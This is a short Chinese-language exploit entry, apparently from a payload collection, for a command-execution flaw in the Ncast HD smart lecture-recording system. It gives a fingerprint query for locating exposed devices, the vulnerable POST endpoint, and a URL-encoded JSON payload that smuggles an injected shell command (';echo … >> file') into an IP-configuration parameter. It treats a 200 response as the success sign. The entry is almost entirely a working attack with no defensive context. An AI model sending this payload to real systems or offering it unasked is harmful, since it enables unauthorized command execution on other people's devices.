# Ncast高清智能录播系统命令执行漏洞

Ncast ｜ 命令执行 ｜ —
- **指纹**：`app="Ncast-产品"`
- **请求**：`POST /classes/common/busiFacade.php HTTP/1.1`

**Payload**
```
%7B%22name%22%3A%22setIpConfig%22%2C%22serviceName%22%3A%22SysManager%22%2C%22userTransaction%22%3Afalse%2C%22param%22%3A%5B%22%3Becho%20dudesuite%3E%3Edudesite.txt%22%2C%22255.255.252.0%22%2C%22192.168.7.1%22%2C%22202.96.128.86%22%2C%22192.168.89.89%22%2C%22255.255.252.0%22%5D%7D
```
- **响应特征**：200